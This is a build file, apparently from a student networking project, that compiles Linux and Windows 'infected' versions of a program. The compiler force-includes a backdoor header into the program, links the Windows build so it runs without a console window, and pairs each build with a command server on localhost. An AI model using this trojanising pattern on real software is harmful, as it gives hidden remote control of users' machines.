# **************************************************************************** #
#                                                                              #
#                                                         :::      ::::::::    #
#    Makefile                                           :+:      :+:    :+:    #
#                                                     +:+ +:+         +:+      #
#    By: joesanto <joesanto@student.42porto.com>    +#+  +:+       +#+         #
#                                                 +#+#+#+#+#+   +#+            #
#    Created: 2026/01/10 19:15:36 by joesanto          #+#    #+#              #
#    Updated: 2026/01/11 22:00:38 by joesanto         ###   ########.fr        #
#                                                                              #
# **************************************************************************** #

CC = cc
MINGW = x86_64-w64-mingw32-gcc
AR = ar rcs
WIN_AR = x86_64-w64-mingw32-ar rcs
WINDOWS_LINKING = -static -static-libgcc -lws2_32

FLAGS = -Wall -Wextra -Werror -g
WINDOWS_FLAGS = -Wall -Wextra -Werror
SERVER_IP = 127.0.0.1
SERVER_PORT = 4242

SRCS_DIR = srcs
INFECT_PROGRAM = $(SRCS_DIR)/program_test.c
INCLUDES = -Iincludes

# ----------------------------------- BINS ----------------------------------- #
BIN_DIR = bin
PROGRAM_NAME := $(notdir $(basename $(INFECT_PROGRAM)))

# CLIENT (LINUX)
LINUX_CLIENT = $(BIN_DIR)/linux_infected_$(PROGRAM_NAME)
WINDOWS_CLIENT = $(BIN_DIR)/windows_infected_$(PROGRAM_NAME)

# SERVER (LINUX)
LINUX_SERVER = $(BIN_DIR)/linux_server
WINDOWS_SERVER = $(BIN_DIR)/windows_server

# ----------------------------------- LIBS ----------------------------------- #
LIBS_DIR = libs

# LIBFT

# (LINUX)
LINUX_LIBFT = $(LIBS_DIR)/linux_libft/libft.a
INCLUDES += -I$(LIBS_DIR)/linux_libft

# (WINDOWS)
WINDOWS_LIBFT = $(LIBS_DIR)/windows_libft/libft.a
INCLUDES += -I$(LIBS_DIR)/windows_libft

# ---------------------------------- SOURCES --------------------------------- #

# CLIENT
CLIENT_DIR = $(SRCS_DIR)/client
BACKDOORS_DIR = $(CLIENT_DIR)/backdoors
CLIENT_CONNECTION_DIR = $(CLIENT_DIR)/socket_client_connection

# (LINUX)
LINUX_BACKDOOR = $(BACKDOORS_DIR)/berkeley_backdoor.h
LINUX_CLIENT_CONNECTION_SRCS = $(CLIENT_CONNECTION_DIR)/berkeley_client_connection.c
LINUX_CLIENT_OBJS += $(LINUX_CLIENT_CONNECTION_SRCS:.c=.o)

# (WINDOWS)
WINDOWS_BACKDOOR = $(BACKDOORS_DIR)/winsock_backdoor.h
WINDOWS_CLIENT_CONNECTION_SRCS = $(CLIENT_CONNECTION_DIR)/winsock_client_connection.c
WINDOWS_CLIENT_OBJS += $(WINDOWS_CLIENT_CONNECTION_SRCS:.c=.o)


# SERVER
SERVER_DIR = $(SRCS_DIR)/server
PROMPT_COMMAND_DIR = $(SERVER_DIR)/prompt_command
SERVER_CONNECTION_DIR = $(SERVER_DIR)/socket_server_connection

PROMPT_COMMAND = $(PROMPT_COMMAND_DIR)/prompt_command_sharedOS.c
INCLUDES += -I$(PROMPT_COMMAND_DIR)/includes

# (LINUX)
LINUX_PROMPT_COMMAND_OBJ = $(basename $(PROMPT_COMMAND))_linux.o
LINUX_RECEIVE_OUTPUT = $(PROMPT_COMMAND_DIR)/berkeley_receive_command_output.c
LINUX_SERVER_MAIN = $(SERVER_DIR)/berkeley_server.c
LINUX_SERVER_CONNECTION_SRCS = $(SERVER_CONNECTION_DIR)/berkeley_server_connection.c
LINUX_SERVER_OBJS += $(LINUX_SERVER_MAIN:.c=.o) $(LINUX_SERVER_CONNECTION_SRCS:.c=.o) \
	$(LINUX_RECEIVE_OUTPUT:.c=.o) $(LINUX_PROMPT_COMMAND_OBJ)

# (WINDOWS)
WINDOWS_PROMPT_COMMAND_OBJ = $(basename $(PROMPT_COMMAND))_windows.o
WINDOWS_RECEIVE_OUTPUT = $(PROMPT_COMMAND_DIR)/winsock_receive_command_output.c
WINDOWS_SERVER_MAIN = $(SERVER_DIR)/winsock_server.c
WINDOWS_SERVER_CONNECTION_SRCS = $(SERVER_CONNECTION_DIR)/winsock_server_connection.c
WINDOWS_SERVER_OBJS += $(WINDOWS_SERVER_MAIN:.c=.o) $(WINDOWS_SERVER_CONNECTION_SRCS:.c=.o) \
	$(WINDOWS_RECEIVE_OUTPUT:.c=.o) $(WINDOWS_PROMPT_COMMAND_OBJ)

# -------------------------------- COMPILATION ------------------------------- #

all: $(LINUX_SERVER) $(LINUX_CLIENT) $(WINDOWS_SERVER) $(WINDOWS_CLIENT)

$(LINUX_SERVER): $(LINUX_LIBFT) $(LINUX_SERVER_OBJS)
	$(CC) $(LINUX_SERVER_OBJS) $(LINUX_LIBFT) -o $@

$(LINUX_CLIENT): FLAGS += -include $(LINUX_BACKDOOR)
$(LINUX_CLIENT): $(LINUX_CLIENT_OBJS) $(INFECT_PROGRAM)
	$(CC) $^ -o $@

$(WINDOWS_SERVER): CC = $(MINGW)
$(WINDOWS_SERVER): FLAGS = $(WINDOWS_FLAGS)
$(WINDOWS_SERVER): AR = $(WIN_AR)
$(WINDOWS_SERVER): $(WINDOWS_LIBFT) $(WINDOWS_SERVER_OBJS)
	$(MINGW) $(WINDOWS_SERVER_OBJS) $(WINDOWS_LIBFT) -o $@ $(WINDOWS_LINKING)

$(WINDOWS_CLIENT): CC = $(MINGW)
$(WINDOWS_CLIENT): FLAGS = $(WINDOWS_FLAGS)
$(WINDOWS_CLIENT): FLAGS += -include $(WINDOWS_BACKDOOR)
$(WINDOWS_CLIENT): $(WINDOWS_CLIENT_OBJS) $(INFECT_PROGRAM)
	$(MINGW) $^ -o $@ $(WINDOWS_LINKING) -mwindows

%libft.a:
	@if [ ! -d "$(dir $@)" ]; then \
		git clone git@github.com:joelsantossouza/libft.git $(dir $@); \
	fi
	make -C $(dir $@) CC="$(CC)" AR="$(AR)" FLAGS="$(FLAGS)"

%_sharedOS_linux.o: %_sharedOS.c
	$(CC) $(FLAGS) $(INCLUDES) -DSERVER_IP=\"$(SERVER_IP)\" -DSERVER_PORT=$(SERVER_PORT) -c $< -o $@

%_sharedOS_windows.o: %_sharedOS.c
	$(CC) $(FLAGS) $(INCLUDES) -DSERVER_IP=\"$(SERVER_IP)\" -DSERVER_PORT=$(SERVER_PORT) -c $< -o $@

%.o: %.c
	$(CC) $(FLAGS) $(INCLUDES) -DSERVER_IP=\"$(SERVER_IP)\" -DSERVER_PORT=$(SERVER_PORT) -c $< -o $@

clean:
	rm -f $(LINUX_CLIENT_OBJS)
	rm -f $(LINUX_SERVER_OBJS)
	rm -f $(WINDOWS_CLIENT_OBJS)
	rm -f $(WINDOWS_SERVER_OBJS)

fclean: clean
	rm -f $(LINUX_CLIENT)
	rm -f $(LINUX_SERVER)
	rm -f $(WINDOWS_CLIENT).exe
	rm -f $(WINDOWS_SERVER).exe

re: fclean all
